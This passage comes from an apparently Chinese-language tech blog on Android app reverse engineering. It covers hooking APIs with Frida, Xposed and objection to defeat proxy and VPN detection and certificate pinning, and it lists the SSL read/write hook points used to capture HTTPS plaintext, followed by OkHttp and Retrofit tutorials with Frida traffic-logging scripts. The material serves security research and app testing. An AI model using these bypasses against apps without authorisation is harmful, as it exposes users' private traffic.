机构签发，保证双方互信。 APP 双向验证情况下，如何进行中间人抓包？ 答：将客户端证书配置到抓包工具即可。 如何获取 APP 的客户端证书和密码？ 答&#x2F;&#x2F;通过 HOOK 证书相关类包&#x2F;&#x2F;在服务器校验客户端的情形下，帮助 dump 客户端证书 代理检测原理：通过系统 API 获取代理状态 安卓系统通过 Proxy 类或 System 属性可以读取系统代理配置。这是最直接的方法，通过检测当前网络环境中的代理设置来判断是否配置了代理。 通过 System.getProperty 获取 host 和 port，可以知道是否进行了代理。对于 Android 9.0 及以上版本，可以通过 ConnectivityManager 和 LinkProperties 来获取 Wi-Fi 代理的配置情况。此方法可以判断是否存在 Wi-Fi 网络下的代理。 在检测到代理设置后，应用可以尝试绕过代理与服务器建立直连，通过特定的超时机制识别代理的存在。如果超时或连接失败，则可能存在代理干扰。 绕过：Hook 相关 API，使其返回“无代理”或“未检测到代理”的结果。 直接在系统底层使用 iptables 强制转发流量（ProxyDroid：全局模式） 证书绑定：什么是证书绑定 在开发时就将服务端证书一块打包到客户端里这样在 HTTPS 建立时与服务端返回的证书比对一致性，进而识别出中间人攻击后直接在客户端侧中止连接 绕过：定位客户端证书绑定的代码位置，并通过 Hook 修改其执行逻辑。编写相应的 Hook 代码，或者使用自动化框架进行操作。 逆向 APP 取出证书，导入到抓包程序中：证书通常在 &#x2F;assets 里，jadx 反编译后搜索 .p12 .pem .cer ssl 等关键词 JustTruetMe：手机上部署 xposed 框架，然后安装此模块，对目标 APP 生效即可 如何定位&#x2F;绕过已知网络通信框架的证书绑定代码？： 1 思路：去熟悉各种框架的证书绑定相关 API 然后编写 HOOK 代码2 各种框架进行证书绑定操作的源代码：https://appmattus.medium.com/android-security-ssl-pinning-1db8acb6621e3HOOK 工程：https://github.com/WooyunDota/DroidSSLUnpinning 或objection 下运行 androidsslpinningdisable 如何定位&#x2F;绕过未知框架的证书绑定代码？:客户端证书不管隐藏的再好，也要从磁盘读取到内存中，可通过 HOOKJava 的 File 类构造函数，检测客户端证书的读取，从此处线索切入，进一步分析调用栈，定位证书绑定代码. VPN 抓包对抗：工具： postern 下载地址 VProxid 下载地址 VPN 抓包和中间人抓包的区别：VPN 抓包本质是在网络层&#x2F;路由层抓包 检测与对抗java.net.NetworkInterface.getName&#x2F;&#x2F;判断网络接口名字包含 pppO 或 tuno hook getName 方法，判断如果得到的 name 是 tun0 或者 ppp0，就返回 rmnet_data0。 android.net.ConnectivityManager.getNetworkCapabilities&#x2F;&#x2F;获取当前网络 Transpoart 字样 getNetworkCapabilities 会返回 NetworkCapabilities 对象，其中包含 TRANSPORT_VPN 等表示 VPN 状态的标志位。通过 hook 这个方法，可以让其在应用检测时返回不包含 TRANSPORT_VPN 的值。 Hook 抓包对抗如何通过 HOOK 抓到 HTTP 包：原理：HTTP 直接走了 Socket, 没有加解密，直接是明文，将内容 dump 下来即可. hook 点： 12java.netSocketOutputStream.socketWriteO(java.io.FileDescriptor&#x27;,‘[B&#x27;,&#x27;int&#x27;,int)java.netSocketlnputStream.socketReadO(java.io.FileDescriptor&#x27;, &#x27;[B&#x27;, &#x27;int&#x27;, &#x27;int&#x27;, &#x27;int&#x27;) 如何通过 HOOK 抓到 HTTPS 明文数据？（或其他应用层协议+SSL 框架）原理： [http 明文]—-&gt; [SSL 库 API]—&gt; [https 密文][SSL 库 API] 调用前这个时机，即加密前，HOOK 截取 http 明文[https 密文]—-&gt; [SSL 库 API]—-&gt; [http 明文]在 [SSL 库 API] 调用后这个时机，即解密后，HOOK 截取 http 明文 结论：hook ssl 库的某个关键 API 协议使用了系统中的 SSL 类库hook 点源代码： java： 123456// Java.androidVersion &gt; 8com.android.org.conscryptConscryptFileDescriptorSocket$SSLOutputStream.write([B&#x27;,int&#x27;,int)com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read([B&#x27;, int&#x27;, int)// Java.androidVersion &lt;= 8com.android.org.conscrypt.OpenSSLSocketlmpl$SSLOutputStream.write([B&#x27;,int,&#x27;int).read（[B’,int&#x27;,“int) native： 1/system/lib/libssl.so库中的SSL_readO和SSL_write0 说明：JAVA 中的 SSLOutputStream.writeO 和 SSLInputStream.read0实际上就是对 libssl.so 库的 SSL_write(和 SSL_read(包装调用 协议使用了自我集成的 SSL 类库哪些 APP 使用自我集成： (1)chromeAndroid L &amp; M libchrome.soAndroid N, O &amp; P libmonochrome.so(2)系统内置 webview使用（pm pathcom.google.android.webview）得到 webview 的路径(3）浏览器 APP 的 webviewOPPO libheytapwebview.so华为 libhwwebviewchromium.so小米 libmiui_chromium.sovivolibwebviewchromium_vivo.so(4）基于 Chromium 的第三方浏览器内核腾讯系的 APPlibmttwebview.sox5 内核阿里小的 APPlibwebviewuc.soUC 的 U4 内核各种小程序 libxwalkcore.so CrossWalk 内核(5）微信（使用多内核的 APP)有些 APP 会使用多个内核，以微信为例，同时使用了 X5 和 CrossWalk 内核：x5com.tencent.mm: tools 进程聊天页面点开的 webview、支付里的页面（长按下拉提示使用 x5 内核的都可以）CrossWalk（长按下拉未提示 x5）com.tencent.mm: toolsmp 进程 公众号文章、搜一搜com.tencent.mm: appbrand 进程 小程序 如何定位它们的 SSL 关键 API（即 HOOK 点）： 对于 native 库，写脚本定位 APP 自带 SSL 库的 SSL_read 和 SSL_write 的偏移量 参考来自 r0capture&#x2F;pic&#x2F;summary2.jpg at main · r0ysue&#x2F;r0capture Socket 通信抓包Java 层 TCP:1 hook 点 socketReado、socketWrite0Java 层 Udp:1 hook 点 sendtoBytes、readBytesJava 层 SSL:1 hook 点 NativeCrypto.SSL_write、NativeCrypto.SSL_readJni 层 Tcp:1hook 点 recvfrom、sendtoJni 层 Udp:1 hook 点 recvfrom、sendtoJni 层 SSL:1 hook 点 read、write","categories":[],"tags":[],"keywords":[]},{"title":"Network_Framework","slug":"Network-Framework","date":"2024-10-07T13:57:45.000Z","updated":"2024-11-11T09:41:14.662Z","comments":true,"path":"2024/10/07/Network-Framework/","link":"","permalink":"http://example.com/2024/10/07/Network-Framework/","excerpt":"","text":"HttpURLConnectionHttpURLConnection 是 Java 标准库中用于进行 HTTP 请求的类，它提供了一种简便的方式来通过 HTTP 协议与服务器进行通信。HttpURLConnection 属于 java.net 包，可以处理各种 HTTP 请求方法（如 GET、POST、PUT、DELETE 等），并支持 HTTPS 等功能。 基本概念和工作原理HttpURLConnection 是一个抽象类，继承自 URLConnection，它专门用于发起 HTTP 请求和接收响应。通过 HttpURLConnection，你可以发送请求到指定的 URL，并读取服务器返回的响应。 基本工作流程： 建立连接：创建 HttpURLConnection 对象，指定请求的 URL。 配置请求：设置 HTTP 请求方法（如 GET、POST）、请求头等。 发送请求：打开连接，发送请求内容。 处理响应：读取服务器的响应状态码和响应内容。 关闭连接：释放资源，关闭连接。 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.BufferedReader;import java.io.InputStreamReader;import java.net.HttpURLConnection;import java.net.URL;public class HttpURLConnectionExample &#123; public static void main(String[] args) &#123; try &#123; // 1. 创建 URL 对象 URL url = new URL(&quot;https://api.example.com/data&quot;); // 2. 打开连接 HttpURLConnection connection = (HttpURLConnection) url.openConnection(); // 3. 设置请求方法 (GET/POST/PUT/DELETE) connection.setRequestMethod(&quot;GET&quot;); // 4. 设置请求头（可选） connection.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0&quot;); connection.setRequestProperty(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;); // 5. 发送请求并获取响应码 int responseCode = connection.getResponseCode(); System.out.println(&quot;Response Code: &quot; + responseCode); // 6. 读取响应内容 BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream())); String inputLine; StringBuffer response = new StringBuffer(); while ((inputLine = in.readLine()) != null) &#123; response.append(inputLine); &#125; in.close(); // 7. 打印响应内容 System.out.println(response.toString()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; HttpsURLConnection 的 GET 和 POST 请求123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384package com.xiaojianbang.test;import android.util.Log;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.io.OutputStream;import java.net.Proxy;import java.net.URL;import javax.net.ssl.HttpsURLConnection;import javax.net.ssl.SSLContext;public class HttpsUtils &#123; //工具类，主要用于处理 HTTPS 请求 public static void doRequest()&#123; //创建一个新线程来执行请求，避免在主线程中进行网络操作 new Thread()&#123; public void run()&#123; String result = HttpsRequest(&quot;POST&quot;, &quot;https://www.baidu.com/&quot;, &quot;user&quot;); //发起 POST 请求 Log.d(&quot;xiaojianbang&quot;,&quot;&quot; + result); &#125; &#125;.start(); &#125; private static SSLContext getSSLContext() &#123; //始化一个 SSLContext 对象，使用 TLS 协议 SSLContext sslContext = null; try &#123; //在异常捕获中打印堆栈跟踪，便于调试 sslContext = SSLContext.getInstance(&quot;TLS&quot;); sslContext.init(null,null, null); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return sslContext; &#125; public static String HttpsRequest(String method, String url, String outputStr) &#123; //这是实际发送请求的核心方法，接受 HTTP 方法、URL 和输出字符串作为参数 try &#123; SSLContext sslContext = getSSLContext(); if (sslContext != null) &#123; URL u = new URL(url); HttpsURLConnection conn = (HttpsURLConnection) u.openConnection(Proxy.NO_PROXY); conn.setRequestMethod(&quot;GET&quot;); conn.setDoInput(true); conn.setUseCaches(false); conn.setConnectTimeout(30000); if(method.equals(&quot;POST&quot;))&#123; conn.setRequestMethod(&quot;POST&quot;); conn.setDoOutput(true); conn.setRequestProperty(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); &#125;//对于 POST 请求，设置 Content-Type 为 application/x-www-form-urlencoded if (null != outputStr) &#123; //如果有输出字符串（仅在 POST 请求中），通过输出流发送数据 OutputStream outputStream = conn.getOutputStream(); outputStream.write(outputStr.getBytes(&quot;UTF-8&quot;)); outputStream.close(); &#125; conn.connect(); //使用输入流读取服务器响应，并使用 BufferedReader 按行读取数据，将其存入 StringBuffer InputStream inputStream = conn.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream, &quot;utf-8&quot;); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String str = null; StringBuffer buffer = new StringBuffer(); while ((str = bufferedReader.readLine()) != null) &#123; buffer.append(str); &#125; //关闭输入流和读取器，断开连接 bufferedReader.close(); inputStreamReader.close(); inputStream.close(); conn.disconnect(); return buffer.toString(); &#125;//返回服务器的响应字符串，如果发生异常则返回 null &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; HttpsURLConnection 的自吐先开启 objection 的 hook 1objection -g com.example.network explore 1android hooking search classes HttpsURLConnection 1android hooking watch class com.android.okhttp.internal.huc.HttpURLConnectionImpl 1234567891011121314151617181920212223242526272829function hook_HttpUrlConnection()&#123; Java.perform(function()&#123; // java.net.URL.URL ($init) (得到 URL) Java.use(&quot;java.net.URL&quot;).$init.overload(&#x27;java.lang.String&#x27;).implementation = function (str)&#123; var result = this.$init(str) console.log(&quot;result , str =&gt; &quot;,result,str); return result; &#125; //HttpURLConnection setRequestProperty 得到各种请求头、属性等 Java.use(&quot;com.android.okhttp.internal.huc.HttpURLConnectionImpl&quot;).setRequestProperty.implementation = function(str1,str2)&#123; var result = this.setRequestProperty(str1,str2); console.log(&quot;.setRequestProperty result,str1,str2-&gt;&quot;,result,str1,str2); return result; &#125; Java.use(&quot;com.android.okhttp.internal.huc.HttpURLConnectionImpl&quot;).setRequestMethod.implementation = function(str1)&#123; var result = this.setRequestMethod(str1); console.log(&quot;.setRequestMethod result,str1,str2-&gt;&quot;,result,str1); return result; &#125; // &#125;)&#125;setImmediate(hook_HttpUrlConnection) okhttp3基础OkHttp 是一个高效的 HTTP 和 HTTP&#x2F;2 客户端，广泛用于 Android 和 Java 应用程序中。它由 Square 开发，提供了许多强大的功能和灵活的 API，适用于各种网络请求场景。 添加依赖在 build.gradle 文件中添加 OkHttp 的依赖： 1implementation &#x27;com.squareup.okhttp3:okhttp:4.10.0&#x27; 创建 OkHttpClient1OkHttpClient client = new OkHttpClient(); 1234java复制代码Interceptor loggingInterceptor = new HttpLoggingInterceptor().setLevel(HttpLoggingInterceptor.Level.BODY);OkHttpClient client = new OkHttpClient.Builder() .addInterceptor(loggingInterceptor) .build(); 发送 GET 请求123456789101112131415161718Request request = new Request.Builder() .url(&quot;https://api.example.com/data&quot;) .build();client.newCall(request).enqueue(new Callback() &#123; @Override public void onFailure(Call call, IOException e) &#123; e.printStackTrace(); &#125; @Override public void onResponse(Call call, Response response) throws IOException &#123; if (response.isSuccessful()) &#123; String responseData = response.body().string(); // 处理响应数据 &#125; &#125;&#125;); 发送 POST 请求123456789101112131415161718192021222324RequestBody requestBody = new FormBody.Builder() .add(&quot;key1&quot;, &quot;value1&quot;) .add(&quot;key2&quot;, &quot;value2&quot;) .build();Request request = new Request.Builder() .url(&quot;https://api.example.com/submit&quot;) .post(requestBody) .build();client.newCall(request).enqueue(new Callback() &#123; @Override public void onFailure(Call call, IOException e) &#123; e.printStackTrace(); &#125; @Override public void onResponse(Call call, Response response) throws IOException &#123; if (response.isSuccessful()) &#123; String responseData = response.body().string(); // 处理响应数据 &#125; &#125;&#125;); 添加拦截器1234Interceptor loggingInterceptor = new HttpLoggingInterceptor().setLevel(HttpLoggingInterceptor.Level.BODY);OkHttpClient client = new OkHttpClient.Builder() .addInterceptor(loggingInterceptor) .build(); OkHttp3 的拦截器是一种可以在网络请求和响应过程中拦截、修改和处理 HTTP 请求和响应的机制。在 OkHttp 中，拦截器类似于一个过滤器，允许开发者在请求发出前或响应返回后执行自定义逻辑，从而实现日志记录、添加认证头、处理重试机制等功能。 拦截器主要分为两类： 应用拦截器（Application Interceptors） 网络拦截器（Network Interceptors） 应用拦截器（Application Interceptors）应用拦截器会在整个请求和响应链条的顶端工作，并且只会被调用一次。它们可以用于修改最终请求和响应，还可以根据需要对请求进行重试或短路。应用拦截器不会处理来自缓存的响应，应用更适合用于日志记录、全局添加 Header、错误重试等场景。 添加应用拦截器示例： 12345678val client = OkHttpClient.Builder() .addInterceptor &#123; chain -&gt; val request = chain.request().newBuilder() .header(&quot;Authorization&quot;, &quot;Bearer token&quot;) .build() chain.proceed(request) &#125; .build() 网络拦截器（Network Interceptors）网络拦截器在网络请求的过程中生效，每次 HTTP 请求都会调用它们，包括从缓存读取的请求。网络拦截器可以访问网络的实际响应状态、头信息等，更适用于监控和调试网络流量、处理缓存逻辑等。 添加网络拦截器示例： 1234567val client = OkHttpClient.Builder() .addNetworkInterceptor &#123; chain -&gt; val response = chain.proceed(chain.request()) // 在这里可以对响应数据进行处理或记录日志 response &#125; .build() 如何使用多个拦截器OkHttp 支持链式调用多个拦截器，拦截器按添加顺序依次执行。一个典型的应用是将应用拦截器用于预处理请求，而将网络拦截器用于网络流量的分析。 1234val client = OkHttpClient.Builder() .addInterceptor(LoggingInterceptor()) // 应用拦截器，用于日志记录 .addNetworkInterceptor(CachingInterceptor()) // 网络拦截器，用于缓存处理 .build() hook自定义拦截器 hook 用 spawn 方式启动 appfrida -U –no-pause -f xxx -l hook.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103function hook_okhttp3() &#123; // 1. frida Hook java 层的代码必须包裹在 Java.perform 中，Java.perform 会将 Hook Java 相关 API 准备就绪。 Java.perform(function () &#123; // 2. 准备相应类库，用于后续调用，前两个库是 Android 自带类库，后三个是使用 Okhttp 网络库的情况下才有的类 var ByteString = Java.use(&quot;com.android.okhttp.okio.ByteString&quot;); var Buffer = Java.use(&quot;com.android.okhttp.okio.Buffer&quot;); var Interceptor = Java.use(&quot;okhttp3.Interceptor&quot;); var ArrayList = Java.use(&quot;java.util.ArrayList&quot;); var OkHttpClient = Java.use(&quot;okhttp3.OkHttpClient&quot;); // 注册一个 Java 类 var MyInterceptor = Java.registerClass(&#123; name: &quot;okhttp3.MyInterceptor&quot;, implements: [Interceptor], methods: &#123; intercept: function (chain) &#123; var request = chain.request(); try &#123; console.log(&quot;MyInterceptor.intercept onEnter:&quot;, request, &quot;\\nrequest headers:\\n&quot;, request.headers()); var requestBody = request.body(); var contentLength = requestBody ? requestBody.contentLength() : 0; if (contentLength &gt; 0) &#123; var BufferObj = Buffer.$new(); requestBody.writeTo(BufferObj); try &#123; console.log(&quot;\\nrequest body String:\\n&quot;, BufferObj.readString(), &quot;\\n&quot;); &#125; catch (error) &#123; try &#123; console.log(&quot;\\nrequest body ByteString:\\n&quot;, ByteString.of(BufferObj.readByteArray()).hex(), &quot;\\n&quot;); &#125; catch (error) &#123; console.log(&quot;error 1:&quot;, error); &#125; &#125; &#125; &#125; catch (error) &#123; console.log(&quot;error 2:&quot;, error); &#125; var response = chain.proceed(request); try &#123; console.log(&quot;MyInterceptor.intercept onLeave:&quot;, response, &quot;\\nresponse headers:\\n&quot;, response.headers()); var responseBody = response.body(); var contentLength = responseBody ? responseBody.contentLength() : 0; if (contentLength &gt; 0) &#123; console.log(&quot;\\nresponsecontentLength:&quot;, contentLength, &quot;responseBody:&quot;, responseBody, &quot;\\n&quot;); var ContentType = response.headers().get(&quot;Content-Type&quot;); console.log(&quot;ContentType:&quot;, ContentType); if (ContentType.indexOf(&quot;video&quot;) == -1) &#123; if (ContentType.indexOf(&quot;application&quot;) == 0) &#123; var source = responseBody.source(); if (ContentType.indexOf(&quot;application/zip&quot;) != 0) &#123; try &#123; console.log(&quot;\\nresponse.body StringClass\\n&quot;, source.readUtf8(), &quot;\\n&quot;); &#125; catch (error) &#123; try &#123; console.log(&quot;\\nresponse.body ByteString\\n&quot;, source.readByteString().hex(), &quot;\\n&quot;); &#125; catch (error) &#123; console.log(&quot;error 4:&quot;, error); &#125; &#125; &#125; &#125; &#125; &#125; &#125; catch (error) &#123; console.log(&quot;error 3:&quot;, error); &#125; return response; &#125; &#125; &#125;); OkHttpClient.$init.overload(&#x27;okhttp3.OkHttpClient$Builder&#x27;).implementation = function (Builder) &#123; console.log(&quot;OkHttpClient.$init:&quot;, this, Java.cast(Builder.interceptors(), ArrayList)); this.$init(Builder); &#125;; var MyInterceptorObj = MyInterceptor.$new(); var Builder = Java.use(&quot;okhttp3.OkHttpClient$Builder&quot;); console.log(Builder); Builder.build.implementation = function () &#123; this.interceptors().clear(); this.interceptors().add(MyInterceptorObj); var result = this.build(); return result; &#125;; Builder.addInterceptor.implementation = function (interceptor) &#123; this.interceptors().clear(); this.interceptors().add(MyInterceptorObj); return this; &#125;; console.log(&quot;hook_okhttp3...&quot;); &#125;);&#125;//hook_okhttp3();setImmediate(hook_okhttp3); Frida 提供了如下 API 用于将 DEX 加载进内存，从而使用 DEX 中的方法和类，因为 DEX 是外来之物，因此称为天外飞仙。（需要注意的是，无法加载 JAR 包）： 1Java.openClassFile(dexPath).load(); (1).解压 app-debug.apk 取出 classes1.dex 文件(其中有目标类) (2).push 到&#x2F;data&#x2F;local&#x2F;tmp 下 (3).修改 Frida Hook 代码： 123456789101112131415161718192021function hook_okhttp3() &#123; // 1. frida Hook java 层的代码必须包裹在 Java.perform 中，Java.perform 会将 Hook Java 相关 API 准备就绪。 Java.perform(function () &#123; Java.openClassFile(&quot;/data/local/tmp/okhttp3logging.dex.dex&quot;).load(); // 只修改了这一句，换句话说，只是使用不同的拦截器对象。 var MyInterceptor = Java.use(&quot;com.roysue.octolesson2ok3.okhttp3Logging&quot;); var MyInterceptorObj = MyInterceptor.$new(); var Builder = Java.use(&quot;okhttp3.OkHttpClient$Builder&quot;); console.log(Builder); Builder.build.implementation = function () &#123; this.networkInterceptors().add(MyInterceptorObj); console.log(&quot;hook Build.build successfully !&quot;) return this.build(); &#125;; console.log(&quot;hooking_okhttp3...&quot;); &#125;);&#125;hook_okhttp3(); (4).Frida Hook，在此之前将 DEMO 中 OKhttpclient 的添加拦截器代码注销，以防干扰，查看 Android Studio 日志，拦截器是否生效。 官方拦截器：（日志） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210package com.r0ysue.learnokhttp;/* * Copyright (C) 2015 Square, Inc. * * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an &quot;AS IS&quot; BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */import android.util.Log;import java.io.EOFException;import java.io.IOException;import java.nio.charset.Charset;import java.util.concurrent.TimeUnit;import okhttp3.Connection;import okhttp3.Headers;import okhttp3.Interceptor;import okhttp3.MediaType;import okhttp3.Request;import okhttp3.RequestBody;import okhttp3.Response;import okhttp3.ResponseBody;import okhttp3.internal.http.HttpHeaders;import okio.Buffer;import okio.BufferedSource;import okio.GzipSource;public final class okhttp3Logging implements Interceptor &#123; private static final String TAG = &quot;okhttpGET&quot;; private static final Charset UTF8 = Charset.forName(&quot;UTF-8&quot;); @Override public Response intercept(Chain chain) throws IOException &#123; Request request = chain.request(); RequestBody requestBody = request.body(); boolean hasRequestBody = requestBody != null; Connection connection = chain.connection(); String requestStartMessage = &quot;--&gt; &quot; + request.method() + &#x27; &#x27; + request.url(); Log.e(TAG, requestStartMessage); if (hasRequestBody) &#123; // Request body headers are only present when installed as a network interceptor. Force // them to be included (when available) so there values are known. if (requestBody.contentType() != null) &#123; Log.e(TAG, &quot;Content-Type: &quot; + requestBody.contentType()); &#125; if (requestBody.contentLength() != -1) &#123; Log.e(TAG, &quot;Content-Length: &quot; + requestBody.contentLength()); &#125; &#125; Headers headers = request.headers(); for (int i = 0, count = headers.size(); i &lt; count; i++) &#123; String name = headers.name(i); // Skip headers from the request body as they are explicitly logged above. if (!&quot;Content-Type&quot;.equalsIgnoreCase(name) &amp;&amp; !&quot;Content-Length&quot;.equalsIgnoreCase(name)) &#123; Log.e(TAG, name + &quot;: &quot; + headers.value(i)); &#125; &#125; if (!hasRequestBody) &#123; Log.e(TAG, &quot;--&gt; END &quot; + request.method()); &#125; else if (bodyHasUnknownEncoding(request.headers())) &#123; Log.e(TAG, &quot;--&gt; END &quot; + request.method() + &quot; (encoded body omitted)&quot;); &#125; else &#123; Buffer buffer = new Buffer(); requestBody.writeTo(buffer); Charset charset = UTF8; MediaType contentType = requestBody.contentType(); if (contentType != null) &#123; charset = contentType.charset(UTF8); &#125; Log.e(TAG, &quot;&quot;); if (isPlaintext(buffer)) &#123; Log.e(TAG, buffer.readString(charset)); Log.e(TAG, &quot;--&gt; END &quot; + request.method() + &quot; (&quot; + requestBody.contentLength() + &quot;-byte body)&quot;); &#125; else &#123; Log.e(TAG, &quot;--&gt; END &quot; + request.method() + &quot; (binary &quot; + requestBody.contentLength() + &quot;-byte body omitted)&quot;); &#125; &#125; long startNs = System.nanoTime(); Response response; try &#123; response = chain.proceed(request); &#125; catch (Exception e) &#123; Log.e(TAG, &quot;&lt;-- HTTP FAILED: &quot; + e); throw e; &#125; long tookMs = TimeUnit.NANOSECONDS.toMillis(System.nanoTime() - startNs); ResponseBody responseBody = response.body(); long contentLength = responseBody.contentLength(); String bodySize = contentLength != -1 ? contentLength + &quot;-byte&quot; : &quot;unknown-length&quot;; Log.e(TAG, &quot;&lt;-- &quot; + response.code() + (response.message().isEmpty() ? &quot;&quot; : &#x27; &#x27; + response.message()) + &#x27; &#x27; + response.request().url() + &quot; (&quot; + tookMs + &quot;ms&quot; + (&quot;, &quot; + bodySize + &quot; body:&quot; + &quot;&quot;) + &#x27;)&#x27;); Headers myheaders = response.headers(); for (int i = 0, count = myheaders.size(); i &lt; count; i++) &#123; Log.e(TAG, myheaders.name(i) + &quot;: &quot; + myheaders.value(i)); &#125; if (!HttpHeaders.hasBody(response)) &#123; Log.e(TAG, &quot;&lt;-- END HTTP&quot;); &#125; else if (bodyHasUnknownEncoding(response.headers())) &#123; Log.e(TAG, &quot;&lt;-- END HTTP (encoded body omitted)&quot;); &#125; else &#123; BufferedSource source = responseBody.source(); source.request(Long.MAX_VALUE); // Buffer the entire body. Buffer buffer = source.buffer(); Long gzippedLength = null; if (&quot;gzip&quot;.equalsIgnoreCase(myheaders.get(&quot;Content-Encoding&quot;))) &#123; gzippedLength = buffer.size(); GzipSource gzippedResponseBody = null; try &#123; gzippedResponseBody = new GzipSource(buffer.clone()); buffer = new Buffer(); buffer.writeAll(gzippedResponseBody); &#125; finally &#123; if (gzippedResponseBody != null) &#123; gzippedResponseBody.close(); &#125; &#125; &#125; Charset charset = UTF8; MediaType contentType = responseBody.contentType(); if (contentType != null) &#123; charset = contentType.charset(UTF8); &#125; if (!isPlaintext(buffer)) &#123; Log.e(TAG, &quot;&quot;); Log.e(TAG, &quot;&lt;-- END HTTP (binary &quot; + buffer.size() + &quot;-byte body omitted)&quot;); return response; &#125; if (contentLength != 0) &#123; Log.e(TAG, &quot;&quot;); Log.e(TAG, buffer.clone().readString(charset)); &#125; if (gzippedLength != null) &#123; Log.e(TAG, &quot;&lt;-- END HTTP (&quot; + buffer.size() + &quot;-byte, &quot; + gzippedLength + &quot;-gzipped-byte body)&quot;); &#125; else &#123; Log.e(TAG, &quot;&lt;-- END HTTP (&quot; + buffer.size() + &quot;-byte body)&quot;); &#125; &#125; return response; &#125; /** * Returns true if the body in question probably contains human readable text. Uses a small sample * of code points to detect unicode control characters commonly used in binary file signatures. */ static boolean isPlaintext(Buffer buffer) &#123; try &#123; Buffer prefix = new Buffer(); long byteCount = buffer.size() &lt; 64 ? buffer.size() : 64; buffer.copyTo(prefix, 0, byteCount); for (int i = 0; i &lt; 16; i++) &#123; if (prefix.exhausted()) &#123; break; &#125; int codePoint = prefix.readUtf8CodePoint(); if (Character.isISOControl(codePoint) &amp;&amp; !Character.isWhitespace(codePoint)) &#123; return false; &#125; &#125; return true; &#125; catch (EOFException e) &#123; return false; // Truncated UTF-8 sequence. &#125; &#125; private boolean bodyHasUnknownEncoding(Headers myheaders) &#123; String contentEncoding = myheaders.get(&quot;Content-Encoding&quot;); return contentEncoding != null &amp;&amp; !contentEncoding.equalsIgnoreCase(&quot;identity&quot;) &amp;&amp; !contentEncoding.equalsIgnoreCase(&quot;gzip&quot;); &#125;&#125; RetrofitRetrofit 是由 Square 公司开发的一个类型安全的 HTTP 客户端库，主要用于 Android 和 Java 应用程序，通过将 REST API 转化为 Java 接口，大大简化了网络请求的实现过程。Retrofit 使用动态代理、注解等机制，让网络请求的定义更直观，并通过与 Gson、Moshi 等序列化工具的集成，支持数据的自动解析与转换。Retrofit 就是 Ok3所有搞 Ok3 的都可以搞 Retrofit Retrofit 的核心工作原理 接口设计：在 Retrofit 中，每一个 HTTP 请求都通过一个 Java 接口的方法来定义。每个方法代表一个 API 端点，并通过注解来指定请求类型（如 GET、POST）和 URL 路径。 动态代理：Retrofit 使用动态代理模式实现接口定义的网络请求，简化了实际代码量。开发者仅需关注接口定义，无需手动实现网络请求。 数据解析与转换：Retrofit 支持多种序列化工具（如 Gson、Moshi）将 API 响应的 JSON 数据自动转换成 Java 对象，提升了代码的可维护性。 主要注解类型 @GET、@POST、@PUT、@DELETE 等：指定 HTTP 请求方法类型。 @Path：用于 URL 路径参数的动态替换，例如 /users/&#123;userId&#125;。 @Query：用于在 URL 中添加查询参数，例如 ?key=value。 @Body：用于 POST 请求的请求体数据。 @FormUrlEncoded 和 @Field：用于表单编码请求（application/x-www-form-urlencoded）。 @Multipart 和 @Part：用于多部分请求，适用于文件上传等场景。 @Headers：用于指定静态的请求头信息。 构建 Retrofit 实例使用 Retrofit.Builder 设置基础配置并生成 Retrofit 实例： 1234Retrofit retrofit = new Retrofit.Builder() .baseUrl(&quot;https://api.example.com/&quot;) // 设置基础 URL .addConverterFactory(GsonConverterFactory.create()) // JSON 解析器 .build(); **baseUrl()**：设置基础 URL，所有接口定义的相对 URL 会以此为基础。 **addConverterFactory()**：添加解析器（如 Gson）以处理响应数据的解析。 **client()**：可设置自定义的 OkHttpClient，用来配置超时、缓存、日志拦截等。 API 接口定义例如，假设我们需要从 https://api.example.com/users/&#123;id&#125; 获取用户信息，可以定义如下接口： 1234public interface ApiService &#123; @GET(&quot;users/&#123;id&#125;&quot;) Call&lt;User&gt; getUser(@Path(&quot;id&quot;) int userId);&#125; 然后使用 Retrofit 创建实例并调用方法： 12ApiService apiService = retrofit.create(ApiService.class);Call&lt;User&gt; call = apiService.getUser(1); 异步与同步请求 同步请求：通过 Call.execute() 来实现，但会阻塞当前线程，通常不推荐在主线程使用。 异步请求：通过 Call.enqueue() 实现，传入回调函数处理响应或错误，避免阻塞主线程。 数据解析Retrofit 支持多种数据转换工厂（Converter Factory），常用的包括： GsonConverterFactory：将 JSON 响应转换成 Java 对象。 MoshiConverterFactory：支持 Moshi 作为数据解析工具。 ScalarsConverterFactory：直接将原始数据作为 String 或 int 类型返回。 Retrofit 与 OkHttpRetrofit 基于 OkHttp 构建，允许与 OkHttp 的拦截器、缓存机制、连接池等进行集成和优化。开发者可以通过自定义 OkHttpClient 来增强 Retrofit 的功能，比如添加日志拦截器、身份验证拦截器等。 Retrofit 基于 OkHttp 构建，允许与 OkHttp 的拦截器、缓存机制、连接池等进行集成和优化。开发者可以通过自定义 OkHttpClient 来增强 Retrofit 的功能，比如添加日志拦截器、身份验证拦截器等。 错误处理Retrofit 提供 onFailure() 